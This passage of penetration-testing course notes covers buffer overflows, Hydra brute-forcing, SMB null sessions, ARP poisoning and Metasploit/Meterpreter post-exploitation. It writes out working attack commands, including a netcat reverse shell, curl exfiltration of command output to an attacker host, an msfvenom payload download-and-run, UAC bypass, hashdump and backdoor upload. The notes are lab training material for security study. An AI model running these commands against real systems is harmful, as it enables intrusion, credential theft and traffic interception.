baners received by a client application </div></li><li><div>etc</div></li></ul><li><div>They have a finite size.</div></li><ul><li><div>If a client-server app is designed to accept only 8 character-long usernames, the username buffer will be 8 bytes long. </div></li></ul><li><div>So, if a developer of an application does not enforce buffer limits, an attacker could find a way to write data beyond the limits. </div></li><li><div>What this means in reality is that they are effectively writing arbitrary code in the computer RAM - this is what can be exploited to get control over the program execution flow</div></li></ul><li><div>What is a stack?</div></li><ul><li><div>Buffers are stored in a special data structure in the computer memory called a stack - it is a data structure used to store data </div></li><li><div>Imagine it like a pile of plates - you can only add to the top of the pile and remove from the bottom of the pile. </div></li><ul><li><div><b>Last in First Out (LIFO)</b> and it uses two methods:</div></li><ul><li><div><b>Push,</b> which  adds an element to the stack</div></li><li><div><b>Pop</b>, which removes the last inserted element</div></li></ul></ul><li><div>In modern OSs, the stack is actually used in a more flexible way. Even if <b>push</b> and <b>pop</b> are still used, an application can actually randomly access a position on the stack to read and write data. </div></li><li><div>Arrays are used to break the stack in to chunks. If we say A has 4 elements and B has 6 elements, what happens if we find a way to copy over A with a 5 element array, they will over write part of A. </div></li><li><div>The Stack used by applications and OS's does not only contain data but also information about the <b>execution flow</b></div></li><ul><li><div>For a function call, the stack contains the function parameters, its local variables and the memory address where the execution of the program must continue after the function returns. </div></li><li><div>Therefore, overwriting a function return address means getting control over the application. Moreover, if an attacker manages to write some valid code in the RAM, they can force the victim function to run their code. </div></li></ul></ul></ul><div><br/></div></div></span>
</div>
<hr>
<a name="1172"/>

<div>
<span><div><div><div><span style="font-weight: bold;">Authentication Cracking</span></div><ul><li><div>Why?</div></li><ul><li><div>Assess password policies via network services</div></li><li><div>Gain access to network services</div></li><li><div>Gain access to web apps</div></li></ul><li><div>Before we looked at cracking passwords in order to obtain login credentials for a system but in reality we can do something similar to attack every service requiring network authentication like</div></li><ul><li><div>SSH</div></li><li><div>Telnet</div></li><li><div>Remote Desktop</div></li><li><div>HTTP authentication</div></li><li><div>More...</div></li></ul><li><div>With this there is still obviously Brute force and Dictionary attacks. Brute force attacks are impractical because of the time needed to run each probe. </div></li><li><div>With John The Ripper the only factor is the processing speed but with network cracking we need to consider</div></li><ul><li><div>Network Latency </div></li><ul><li><div>time needed to transmit information from the pentesters machine to the target server and vice versa</div></li></ul><li><div>Delays on the attacked service</div></li><ul><li><div>many services pause for a while between authentication attempts</div></li></ul><li><div>Processing time on the attacked server</div></li><ul><li><div>same factor as in offline attacks</div></li></ul></ul><li><div>Therefore, network authentication cracking relies almost entirely on dictionary-based attacks. </div></li><li><div>Most tools that do this use common/default dictionary lists etc. </div></li><ul><li><div>You can also install some common password lists on Kali by installing the seclists package. </div></li><ul><li><div>apt-get install seclists</div></li></ul></ul></ul><div><br/></div><div><br/></div><ul><li><div>Tools?</div></li><ul><li><div>Hyrda</div></li><ul><li><div>Fast and supports different protocols (50+)</div></li><ul><li><div>Cisco</div></li><li><div>FTP</div></li><li><div>HTTP</div></li><li><div>IMAP</div></li><li><div>RDP</div></li><li><div>SMB</div></li><li><div>SSH</div></li><li><div>Telnet</div></li></ul><li><div>Dictionaries and brute force. </div></li><li><div>Based on modules</div></li><ul><li><div>A module is a piece of code that lets Hydra attack a specific protocol</div></li><ul><li><div>To get detailed information about a module you can use a -U switch</div></li><ul><li><div>hydra -U rdp</div></li></ul></ul></ul><li><div>hydra -L users.txt -P pass.txt &lt;service://server&gt; &lt;options&gt; </div></li><ul><li><div>hydra -L users.txt -P pass.txt telnet://target.server</div></li><li><div>hydra -L users.txt -P pass.txt http-get://localhost/</div></li></ul></ul></ul></ul><div><br/></div><div><span style="font-weight: bold;">Hydra Cracking Video</span></div><ul><li><div>If we have an online form, we first need to see how it works by inspecting the element and seeing what request it sends and to where.</div></li><li><div>-l is if we already know the username, -L is to use a username wordlist.  </div></li><li><div>-U module selection</div></li><ul><li><div>hydra -U http-post-form will show you how to use that module</div></li></ul><li><div>hydra crackme.site http-post-form &quot;/login.php:usr=^USER^&amp;pwd=^PASS^:invalid credentials&quot; -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt -f -V</div></li><li><div>For SSH</div></li><ul><li><div>hydra 102.155.124.31 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -V</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Windows Shares</span></div><ul><li><div>Why?</div></li><ul><li><div>Enumerate network resources</div></li><li><div>Attack Windows sessions</div></li><li><div>Obtain unauthorised access to Windows resources</div></li></ul><li><div>NetBIOS</div></li><ul><li><div>Servers and clients use NetBIOS when viewing network shares on the LAN.</div></li><li><div>When you query it you can sometimes get:</div></li><ul><li><div>Hostname</div></li><li><div>NetBIOS name</div></li><li><div>Domain</div></li><li><div><span style="font-weight: bold;">Network shares </span></div></li></ul><li><div>It sits between the application layer and the IP layer. </div></li><li><div>UDP?</div></li><ul><li><div>name resolution 137/UDP</div></li><li><div>carry other one-to-many datagram-based communications 138/UDP</div></li></ul><li><div>TCP?</div></li><ul><li><div>Heavy traffic such as a file copy - this relies on NetBIOS <span style="font-weight: bold;">sessions 139/TCP</span></div></li></ul><li><div><span style="font-weight: bold;">Each</span> of the different features use different ports</div></li><li><div>When a Windows machine browses a Network, it uses </div></li><ul><li><div><span style="font-weight: bold;">Datagrams</span> to list the shares and the machines</div></li><li><div><span style="font-weight: bold;">Names</span> to find workgroups</div></li><li><div><span style="font-weight: bold;">Sessions</span> to transmit data to and from a <span style="font-weight: bold;">Windows Share</span></div></li></ul><li><div>These features are very important in office environments where you need to share files etc on servers. </div></li><li><div>Creating shares is quite simple but can wreak havoc if not  properly configured. </div></li><li><div>Users can choose a single file or use the <span style="font-style: italic;">public directory. </span></div></li><ul><li><div>Single file = can choose local/remote users</div></li><li><div>Public directory = can choose local users but can only allow everyone or no one in the network to access the share</div></li></ul><li><div>An unauthorised user can access shares by using Universal Naming Convention Paths (UNC paths)</div></li><ul><li><div>\\ServerName\ShareName\file.nat</div></li></ul><li><div>There are some default <span style="font-weight: bold;">administrative shares</span> which are used by sysadmins and Windows itself</div></li><ul><li><div>\\ComputerName\C$ </div></li><ul><li><div>lets an admin access a volume on the local machine.</div></li></ul><li><div>\\ComputerName\admin$</div></li><ul><li><div>points to windows installation directory</div></li></ul><li><div>\\ComputerName\ipc$ </div></li><ul><li><div>inter-process communication - cannot be browsed to via Windows Explorer</div></li></ul></ul><li><div>If you can access a share, you can access the resources of the computer hosting it. So, badly configured shares can lead to:</div></li><ul><li><div>Information disclosure</div></li><li><div>Unauthorised file access</div></li><li><div>Information leakage used to mount a targeted attack</div></li></ul></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Null Sessions</span></div><ul><li><div>Why?</div></li><ul><li><div>Understand a historic vulnerability</div></li><li><div>Can still be found on legacy systems</div></li><li><div>Deepen understanding of Windows shares.</div></li></ul><li><div>What can this exploit be used for? To steal info about:</div></li><ul><li><div>Passwords</div></li><li><div>System users</div></li><li><div>System groups</div></li><li><div>Running system processes</div></li></ul><li><div>Firstly, they are remote exploitable</div></li><ul><li><div>It can be used to call remote APIs and remote procedure calls. </div></li></ul><li><div>Nowadays, Windows are immune to this but legacy hosts can still be vulnerable. </div></li><li><div>So, the attack itself</div></li><ul><li><div>It exploits an authentication vulnerability for Windows Administrative Shares - allows an attack to connect to a local or remote share without authentication</div></li><li><div>First we need to enumerate the shares. </div></li><ul><li><div>In windows that is <span style="font-style: italic;">nbstat</span></div></li><li><div>It is a CLI tool that can display information about a target. </div></li><li><div>/?</div></li><ul><li><div>nbstat -A &lt;IP&gt;</div></li><li><div>&lt;00&gt; means workstation</div></li><li><div>UNIQUE means the workstation only has one IP address assigned</div></li><li><div>&lt;20&gt; is a file sharing service that is running on the machine. </div></li><li><div>Now we know that there is a Filer Server service running, we can enumerate the shares by using the NET VIEW command</div></li></ul></ul><li><div>NET VIEW &lt;target IP&gt;</div></li></ul><li><div>To do this with on a Linux machine</div></li><ul><li><div>nmblookup -A &lt;target IP&gt;</div></li><li><div>also</div></li><ul><li><div>smbclient -L //10.130.13.140 -N</div></li><ul><li><div>-L shows services on the target</div></li><li><div>-N forces tool to not ask for a password. </div></li><li><div>This can also display shares not seen in the nbstat tool</div></li></ul></ul></ul><li><div>So, we have detected that File and Printer Sharing service is active and we have enumerated the available shares on a target - its time to check if a null session attack is possible. </div></li><li><div>How?</div></li><ul><li><div>exploit the IPC$ administrative share by trying to connect to it without valid credentials. </div></li><ul><li><div>NET USE \\&lt;targetIP&gt;\IPC$ &quot; /u:&quot;</div></li><ul><li><div>This says connect with empty password and username</div></li></ul><li><div>net use \\10.130.40.60\IPC$ &quot; /u:&quot;</div></li></ul></ul><li><div>This <span style="font-weight: bold;">only</span> works with the IPC$ share</div></li><li><div>You can also use <span style="font-style: italic;">smbclient</span></div></li><ul><li><div>smbclient //10.130.40.50/IPC$ -N</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><ul><li><div>There are also tools that automate this </div></li><li><div>Enum</div></li><ul><li><div>Command line utility that can retrieve information from a system vulnerable to null session attacks. </div></li><li><div>enum -s 10.130.40.80 will enumerate the shares</div></li><li><div>enum -u will enumerate the users </div></li><li><div>enum -P will check the password policy (used during a network authentication attack)</div></li><ul><li><div>prevent account lockouts</div></li><li><div>prevent false positives</div></li><li><div>choose your dictionary or bruteforcer configuration</div></li></ul></ul><li><div>winfo will also automate null session exploitation</div></li><ul><li><div>winfo 10.130.40.80 -n </div></li><ul><li><div>download from packetstorm</div></li></ul></ul><li><div>enum4linux is a PERL script that can perform the same operations of enum and Winfo. </div></li><ul><li><div>User enumeration</div></li><li><div>Share enumeration</div></li><li><div>Group and member enumeration</div></li><li><div>Password policy extraction</div></li><li><div>OS information detection</div></li><li><div>a <span style="font-style: italic;">nmblookup</span> run</div></li><li><div>Printer information extraction</div></li></ul></ul><div><br/></div><div><br/></div><ul><li><div>Null sessions are a piece of history of Windows hacking. Even if they are off for modern machines you can sometimes find the on enterprise networks. This is because of retro compatibility with legacy systems and applications. </div></li></ul><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Null Session Video</span></div><ul><li><div>The reason why you can only use the IPC$ share for this is because the point of this share is just to allow &quot;inter-communication processes&quot; between computers on the network</div></li><li><div>Start with a syn scan for the ports that we use for printer and file sharing</div></li><ul><li><div>nmap -sS -p 136,139, 445 192.168.102.0/24</div></li><li><div>enum4linux is already installed in kali</div></li><li><div>enum4linux -n 192.168.104.22</div></li><ul><li><div>Look for &lt;20&gt;</div></li><ul><li><div>If you see this is a share</div></li></ul></ul><li><div>enum4linux -P 192.168.104.22</div></li><ul><li><div>This shows password policy </div></li></ul><li><div>enum4linux -S 192.168.104.22</div></li><ul><li><div>this shows shares</div></li></ul><li><div>enum4linux -s /usr/share/enum4linx/share-list.txt 192.168.104.22</div></li><ul><li><div>This will brute force the shares to try to enumerate some more </div></li></ul><li><div>or you can sack all that and just type </div></li><ul><li><div>enum4linux -a 192.168.104.22</div></li><ul><li><div>this just does it all</div></li></ul></ul></ul></ul><div><br/></div><div><br/></div><ul><li><div>smardump is another tool</div></li><li><div>cd /usr/share/doc/python-inpacket-doc/examples/samrdump.py</div></li><ul><li><div>python samrdump.py 192.168.104.22</div></li></ul><li><div>This gives lots of info about the machine and stuff</div></li></ul><div><br/></div><div><br/></div><ul><li><div>You can also use nmap with certain scripts to see what information you can get if you know that the </div></li><ul><li><div>nmap -script=smb-enum-shares &lt;targetIP&gt;</div></li><li><div>nmap -script=smb-enum-users &lt;targetIP&gt;</div></li><li><div>nmap -script=smb-brute &lt;targetIP&gt;</div></li></ul></ul><div><br/></div></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">ARP Poisoning</span></div><ul><li><div>Why?</div></li><ul><li><div>MITM attacks</div></li><li><div>Mount advanced attacks</div></li><li><div>Sniff traffic on a switched network</div></li></ul><li><div>Powerful attack used to intercept traffic on a switched network. </div></li><li><div>Remember, to send an IP packet a host needs to know the MAC address of the next hop - router, switch or destination host</div></li><li><div>To do this, computers use Address Resolution Protocol.</div></li><ul><li><div>Who has 192.168.7.97?</div><div>Tell 192.168.7.45</div></li><li><div>FF:FF:FF:FF:FF</div></li></ul><li><div>After address resolution is complete, hosts save the destinaton address in their ARP cache table</div></li><li><div>If an attacker can manipulate the ARP cache they will be able to receive traffic destined for other IPs. </div></li><li><div>During an ARP poisoning attack, three actors are involved</div></li><ul><li><div>Two network nodes and an attacker</div></li></ul><li><div>The attacker can manipulate other hosts' ARP cache tables by sending <span style="font-weight: bold;">gratuitous</span> ARP <span style="font-weight: bold;">replies</span></div></li><ul><li><div>These are unsolicited ARP reply message - replies send without waiting for a host to perform a request. </div></li><li><div>This operation must be performed on every victim</div></li></ul><li><div>Once this is complete, every packet of every communication between the posoned nodes will be sent to the attackers machine. </div></li><ul><li><div>The attacker can prevent the poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds or so. </div></li></ul><li><div>The attacker must forward every paket to the correct node. The attacker can also, however, change the contents of the packets </div></li><li><div>This could be performed on an entire network and against a <span style="font-weight: bold;">router</span> meaning that this could even be carried out between communications from a LAN to the internet!</div></li></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><ul><li><div>How?</div></li><ul><li><div>Dsniff</div></li><ul><li><div>arpspoof</div></li></ul><li><div>Before running the tool you have to enable the linux kernel IP forwarding, a feature that transforms a linux box into a router </div></li><li><div>This will make sure that the machine forwards the packets to the real destination</div></li><ul><li><div>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</div></li></ul><li><div>You can then run arpspoof</div></li><ul><li><div>arpspoof -i &lt;interface&gt; -t &lt;target&gt; -r &lt;hosts&gt;</div></li><ul><li><div>Interface is the NIC (eth0 for local LAN or tap0 on Hera Lab)</div></li><li><div>target and host are IPs</div></li></ul></ul><li><div>aprspoof -i eth0 -t 192.168.4.11 -r 192.168.4.16</div></li><li><div>then run wireshark and intercept the traffic</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">ARP Spoofing Video</span></div><ul><li><div>run wireshark on eth0</div></li><li><div>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</div></li><ul><li><div>This is essential</div></li></ul><li><div>arpspoof -i eth0 -t &lt;IP&gt; -r &lt;IP&gt;</div></li><li><div>look for HTTP post message on login.php</div></li><li><div>ctrl + C</div></li><li><div>create some file sharng traffic by acccesign a share, put SMB as the filter in wireshark </div></li><ul><li><div>file</div></li><li><div>go to export objects</div></li><li><div>smb/smb2</div></li><li><div>click a file, click save as</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Metasploit</span></div><ul><li><div>Why?</div></li><ul><li><div>Wide array of attacks at your disposal</div></li><li><div>Ability to automate your own exploits</div></li></ul><li><div>Metasploit is an open-source framework used for pentesting and exploit development</div></li><li><div>Wide range of community contributed exploits and attack vectors. </div></li><ul><li><div>Extensible and can be used to automate your own exploits</div></li></ul><li><div>Metasploit has a web interface, command line interface and a console interface (MSFConsole)</div></li><ul><li><div>1400 exploits and 356 payloads.</div></li><li><div>Basic workflow is</div></li><ul><li><div>Identify a vulnerable service</div></li><li><div>Search for a proper exploit of the service</div></li><li><div>Load and configure the exploit</div></li><li><div>load and configure the payload you want to use</div></li><li><div>run the exploit code and gain access to the vulnerable machine</div></li></ul><li><div>Start it just by typing </div></li><ul><li><div>msfconsole</div></li></ul><li><div>Search by</div></li><ul><li><div>search &lt;mysearch&gt;</div></li><ul><li><div>skeleton = single result</div></li><li><div>tubroftp gives a single result too</div></li><li><div>searching for both returns 2 results</div></li></ul></ul><li><div>Display exploits by</div></li><ul><li><div>show exploits </div></li><ul><li><div>this being said with thousands of exploits available it is very impractical to use </div></li></ul></ul><li><div>Enable an exploit by</div></li><ul><li><div>use &lt;exploit path&gt;</div></li><ul><li><div>use /exploit/windows/ftp/turbotfp_port</div></li></ul><li><div>at this point the MSFconsole will change. This is because metasploit uses a file-system-like hierarchy to store encoders, nops, exploits, payloads and auxiliary modules. </div></li><li><div>to go <span style="font-weight: bold;">back</span> command</div></li><li><div>Once the exploit is loaded you can view related information using the <span style="font-weight: bold;">info</span> command</div></li><li><div>You can also check its options with <span style="font-weight: bold;">show options</span> </div></li><li><div>to configure an option, you have to use the <span style="font-weight: bold;">set</span> command</div></li><ul><li><div>set -h</div></li></ul></ul></ul><li><div><span style="font-weight: bold;">Configuring a payload</span></div></li><ul><li><div>To run an exploit, a payload is needed. </div></li><li><div>Payloads are pieces of code injected by an exploit module into the victim machine or service</div></li><ul><li><div>This can be used to get</div></li><ul><li><div>an OS shell</div></li><li><div>a VNC or RDP connection</div></li><li><div>a <span style="font-weight: bold;">meterpreter shell</span></div></li><li><div>the execution of an attacker-supplied application</div></li></ul></ul><li><div>Metasploit provides different payloads for different OS', with different architectures and show diferent features. </div></li><ul><li><div>You can show them by typing <span style="font-weight: bold;">show payloads</span> </div></li><li><div>If you use <span style="font-weight: bold;">show payloads</span> when you have loaded an exploit you will see only the payloads which work with that specific exploit. </div></li></ul><li><div>You can choose a payload with the <span style="font-weight: bold;">set payload</span> command followed by the payload name and then you can check the options using the <span style="font-weight: bold;">show options</span> command. </div></li><li><div>After you have loaded a payload you use the <span style="font-weight: bold;">set</span> command to configure the payload itself.</div></li><li><div>Once you have configured the exploit and payload you are ready to launch the attack.</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><ul><li><div>Launching the attack is as simple as running <span style="font-weight: bold;">exploit</span></div></li><li><div>Most of the time a pentester aim is to gain a shell on the target machine. This can be achieved by choosing the right <span style="font-weight: bold;">metasploit</span> payload. </div></li><ul><li><div>A special payload, with many useful features from the pentesting point of view, is <span style="font-weight: bold;">Meterpreter</span></div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Meterpreter</span></div><ul><li><div>Why?</div></li><ul><li><div>Get a powerful shell on an expoited machine</div></li><li><div>Take control over an exploited machine</div></li><li><div>Install backdoors</div></li></ul><li><div>Meterpreter is a powerful shell which runs on lots of platforms and is used to help a penetration tester further infiltrate the target system</div></li><ul><li><div>More than a shell, it provides advanced features to gather information, trasnfer files between the attacker and victim machines and installs backdoors and more.</div></li></ul><li><div>To see what is available:</div></li><ul><li><div>msf &gt; search meterpreter</div></li></ul><li><div>To choose a payload use <span style="font-weight: bold;">set</span></div></li><ul><li><div>msf exploit (explmod) &gt; set payload windows/meterpreter/reverse_tcp</div></li></ul><li><div>Bind and reverse</div></li><ul><li><div>Meterpreter can both wait for a connection on the target machine or connect back to the attacker machine:</div></li><ul><li><div><span style="font-weight: bold;">bind_tcp</span> </div></li><ul><li><div>runs server process on the target machine and waits for connections from the attacker</div></li></ul><li><div><span style="font-weight: bold;">reverse_tcp</span> </div></li><ul><li><div>performs TCP connection back to the attacker machine - can evade firewalls.</div></li></ul></ul><li><div>Configuring the module is just a case of setting the right payload for an exploit module</div></li><ul><li><div>&gt;set payload <span style="font-weight: bold;">windows/meterpreter/reverse_tcp</span></div></li><li><div>&gt; set payload <span style="font-weight: bold;">linux/x86/meterpreter/reverse_tcp</span></div></li><li><div>&gt; set payload <span style="font-weight: bold;">windows/meterpreter/bind_tcp</span></div></li></ul></ul><li><div>Launching meterpreter</div></li><ul><li><div>After you set the right payload for the attack, you have to run the exploit to get a meterpreter <span style="font-weight: bold;">session</span></div></li><ul><li><div>msf exploit (handler) &gt; <span style="font-weight: bold;">exploit</span></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div>[+] Meterpreter session 1 opened</div></li><li><div><span style="font-weight: bold;">meterpreter &gt;</span></div></li></ul></ul><li><div>This is basically now an advanced shell on the target machine. </div></li></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><ul><li><div>Sessions</div></li><ul><li><div>A single instance of MSFconsole can host multiple meterpreter sessions. </div></li><ul><li><div><span style="font-weight: bold;">background</span> will switch from a meterpreter session to the console. </div></li><li><div>here you can see the sessions with <span style="font-weight: bold;">sessions -l</span></div></li><li><div>Then, to select one <span style="font-weight: bold;">sessions -i 1</span></div></li></ul></ul></ul><div><br/></div><div><br/></div><ul><li><div>Information gathering</div></li><ul><li><div>Meterpreter lets you perform information gathering on the exploited machine and network</div></li><ul><li><div>Information about the machine and OS</div></li><ul><li><div><span style="font-weight: bold;">sysinfo</span></div></li></ul><li><div>Network configuration in use</div></li><ul><li><div><span style="font-weight: bold;">ifconfig</span></div></li></ul><li><div>routing table</div></li><ul><li><div><span style="font-weight: bold;">route</span></div></li></ul><li><div>info about user running the exploited process.</div></li><ul><li><div><span style="font-weight: bold;">getuid</span></div></li></ul></ul></ul></ul><div><br/></div><ul><li><div>Privilege escalation</div></li><ul><li><div>If the owner of the process does not have high privileges on the victim system, you can use <span style="font-weight: bold;">getsystem</span></div></li><ul><li><div>This runs a privilege escalation routine on the target machine. </div></li><li><div>In a Windows environment, the <span style="font-weight: bold;">system user</span> has the highest privileges on a machine</div></li><ul><li><div>This is now normally blocked by User Account Control policy in modern Windows OS's.</div></li><li><div>This can be bypassed by <span style="font-weight: bold;">bypassuac</span></div></li></ul></ul></ul><li><div>Now you have  privileged user access on the victim machine you can dump the passwords database and save it for an offline cracking session</div></li><ul><li><div><span style="font-weight: bold;">hashdump</span> dumps the password database of a Windows machine</div></li><ul><li><div>Once configured, you can run <span style="font-weight: bold;">exploit</span></div></li></ul></ul><li><div>Meterpreter lets you run linux-like commands even in a windows environment. </div></li><li><div>You can also upload and download files </div></li><ul><li><div>download HaxLogs.log /root/</div></li><li><div>upload /root/backdoor.exe C:\\Windows</div></li></ul><li><div>You can also run a standard operating sysyem shell</div></li><ul><li><div><span style="font-weight: bold;">shell</span></div></li></ul><li><div>-h for help </div></li></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Metasploit Video</span></div><ul><li><div>3 version - pro, community, framework (small networks)</div></li><li><div>applications -&gt; update metasploit</div></li><ul><li><div>msfupdate</div></li></ul><li><div>First, we need to run some services</div></li><ul><li><div>service postgresql start</div></li><li><div>service metasploit start</div></li><li><div>msfconsole</div></li></ul><li><div>help</div></li><ul><li><div>core commands</div></li><li><div>database commands</div></li></ul><li><div>search -h</div></li><ul><li><div>We can scan networks from the msfconsole</div></li></ul><li><div>search arp</div></li><ul><ul><li><div>copy the path</div></li><li><div>use &lt;command path&gt; </div></li><ul><li><div>show options</div></li></ul><li><div>set RHOSTS 192.168.102.0/24</div></li><ul><li><div>show options</div></li></ul><li><div>run</div></li></ul></ul><li><div>port scan?</div></li><ul><li><div>search port scan</div></li><li><div>use &lt;path&gt;</div></li><li><div>show options</div></li><li><div>set RHOSTS 192.168.102.128</div></li><li><div>set PORTS 1-500</div></li><li><div>show options</div></li></ul><li><div>checking for vulnerable smb</div></li><ul><li><div>nmap --script smb-check-vulns.nse --script-args=unsafe=1 192.168.120.108</div></li><li><div>This will show us if it is vulnerable</div></li></ul><li><div>now lets go to msfconsole</div></li><ul><li><div>search &lt;name of vuln&gt;</div></li><li><div>use &lt;path&gt;</div></li><li><div>show options</div></li><li><div>&lt;set options&gt;</div></li><li><div>show payloads</div></li><li><div>/windows/meterpreter/reverse_tcp</div></li><li><div>set payload &lt;path&gt;</div></li><li><div>show options</div></li><li><div>&lt;set options&gt;</div></li><li><div>exploit</div></li><ul><li><div>WE IN</div></li></ul></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Meterpreter Video</span></div><ul><li><div>Payload</div></li><li><div>Advanced features for pentesters after they have gained access to a machine. </div></li><li><div>Interactive shell</div></li><li><div>First we need an exploited machine, one with a backdoor. Run this so we have a sessio</div></li><li><div>Remember we can background them </div></li><ul><li><div>sessions -i 1 to get it back</div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><ul><li><div>Information gathering?</div></li><ul><li><div>help or ? for manual</div></li><li><div>STD API </div></li><ul><li><div>Browse and navigate commands</div></li></ul><li><div>Network commands</div></li><li><div>System commands</div></li></ul><li><div>Beyond all of these, we can also run scripts specifically for certain things</div></li><li><div>Normally lets start with</div></li><ul><li><div>sysinfo</div></li><li><div>inconfig</div></li><ul><li><div>Lots of interfaces?</div></li><li><div>Physical?</div></li><li><div>Virtual? VPN??</div></li></ul><li><div>ps  </div></li><ul><li><div>which one are we?</div></li><ul><li><div><span style="font-weight: bold;">getpid</span></div></li></ul><li><div>search for it here</div></li></ul><li><div>pwd</div></li><ul><li><div>will be where the backdoor is stored</div></li></ul><li><div>ls </div></li><li><div>cd .. </div></li><li><div>Wanna download?</div></li><ul><li><div>Good if a file cannot be opened with <span style="font-weight: bold;">cat</span></div></li><li><div>download &lt;pathOnRemote&gt; &lt;pathOnLocal&gt;</div></li></ul></ul><li><div>Higher privileges?</div></li><ul><li><div><span style="font-weight: bold;">getsystem</span></div></li><ul><li><div>Failed? UAC</div></li><li><div>run <span style="font-weight: bold;">run post/windows/gather/win_privs</span></div></li><li><div>Will tell us the current user details</div></li></ul><li><div>Background it while we look UAC bypass options.</div></li></ul><li><div><span style="font-weight: bold;">search UAC</span></div></li><ul><li><div><span style="font-weight: bold;">use exploit/windows/local/bypassuac</span></div></li><li><div><span style="font-weight: bold;">show options</span></div></li><li><div><span style="font-weight: bold;">set SESSION 1</span></div></li><li><div><span style="font-weight: bold;">exploit</span></div></li></ul><li><div>New session</div></li><ul><li><div>getuid</div></li><li><div><span style="font-weight: bold;">run post/windows/gather/win_privs</span></div></li></ul><li><div><span style="font-weight: bold;">getsystem</span></div></li><ul><li><div>NT AUTHORITY SYSTEM is the best</div></li></ul><li><div>Lets say that you want to change the PID to something a little bit more stealthy so that if someone where to look they would not find  anything fishy</div></li><ul><li><div>Firstly, you have to choose a process with the same privileges that we currently have</div></li><li><div>ps -U SYSTEM</div></li><ul><li><div>displays ones only with system privs</div></li></ul><li><div>migrate &lt;PID NUMBER&gt;</div></li></ul><li><div>Only if we have system privs we can run hashdump</div></li><ul><li><div><span style="font-weight: bold;">hashdump</span></div></li></ul></ul><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Beyond remote code execution</span> <span style="font-weight: bold;">Video</span></div><div><br/></div><ul><li><div>This is when we can execute OS commands on the victim system.</div></li><li><div>Rarely a vuln on its own, but the result of a different vuln</div></li><li><div>Doesn't have to be in a shell</div></li><li><div>This is about how to detect and extend these privileges</div></li></ul><div><br/></div><div><br/></div><div><br/></div><ul><li><div>First situation - Lets say you think that you have found some way of executing code in to the machine but there is no output, how can you tell if it is working or not?</div></li><ul><li><div>These kinds of vulnerabilities are called <span style="font-weight: bold;">Blind</span></div></li><li><div>What we could do is try to stop the service in some way so that we as a user can see if it is working. </div></li><li><div>Go to burp, intercept the request, add c=sleep+5</div></li><li><div>If the response takes 5 seconds to return, then we have a blind remote code vulnerability</div></li></ul><li><div>Can we ping the remote machine?</div></li><ul><li><div>open up wireshark</div></li><li><div>filter icmp</div></li><li><div>inject your own IP in to the vulnerable parameter</div></li><ul><li><div>ping &lt;IP&gt; -c in the burp request </div></li><li><div>convert section - URL - <span style="font-style: italic;">2nd option after URL Decode</span></div></li></ul></ul><li><div>To demonstrate the damage this could cause, you can perhaps upload a simple php non-interactive web shell that will display output and use it like a normal shell.</div></li><li><div>First, identify constraints</div></li><ul><li><div>To get a reverse shell, we either need to use tools already on the remote system or find a way to import our tools.</div></li><li><div>echo $PATH</div></li><li><div>visit some of these locations to see what tools are there. </div></li><li><div>is there netcat? python?</div></li><ul><li><div>which nc</div></li><li><div>which python</div></li></ul></ul><li><div>Let's try with netcat</div></li><ul><li><div>/var/www/html/server# nc -lvp 53</div></li><li><div>Go to non-interactive shell</div></li><ul><li><div>nc &lt;yourIP&gt; 54 -e /bin/bash</div></li></ul><li><div>This works, but in reality it would be unlikely that a remote system would have netcat</div></li></ul><li><div>Curl is often present on linux systems and besides allowing command line web browsing it also has a file transfer utility</div></li><ul><li><div>/var/www/html/server# nc -lvp 53</div></li><li><div>In the non-interactive shell:</div></li><ul><li><div>curl http://&lt;IP&gt;:53</div></li></ul><li><div>Worked</div></li><ul><li><div>curl http://&lt;IP&gt;:53/`whoami`</div></li><li><div>curl http://&lt;IP&gt;:53/`id`</div></li></ul><li><div>spaces in the command output breaks the request. Lets try to encode it in base 64</div></li><ul><li><div>curl http://&lt;IP&gt;:53/`id | base 64`</div></li><li><div>echo &quot;&lt;base 64 blob&gt;&quot; | base64 -d</div></li></ul></ul><li><div>curl-T used for transfering files to an attacker</div></li><li><div>In most cases though, you will be more interested in transferring files on to the victim machine - probably a metasploit generated reverse shell payload</div></li><li><div>For this we need 3 things</div></li><ul><li><div>HTTP server on machine</div></li><li><div>File download utility on the remote machine</div></li><li><div>writable location on the remote machine</div></li></ul><li><div>cd /var/www/html/server </div></li><li><div>python -m SimpleHTTPServer 9090</div></li><ul><li><div>Remember all files will be visible so it is better to have a separate file.</div></li><li><div>Unless you are running as root there are many places where you will not be able to write to so you have to use /tmp or /usr/tmp</div></li></ul><li><div>Lets prepare a simple reverse shell payload using msfvenom</div></li><ul><li><div>msfvenom -p linux/x64/shell_reverse_tcp lhost=&lt;IP&gt; lport=53 -f elf -o reverse53</div></li></ul><li><div>Now browse to the IP that is hosting the web server or if you have a non-interactive shell then</div></li><ul><li><div>curl http://&lt;IP&gt;:9090/reverse53-o /tmp/r</div></li><li><div>chmod +x /tmp/r</div></li></ul><li><div>We can check if it is there by running nc and trying to send it back</div></li><li><div>Now we just need to run it</div></li><li><div>In terminal</div></li><ul><li><div>nc -lvp 53</div></li></ul><li><div>In non-interactive web 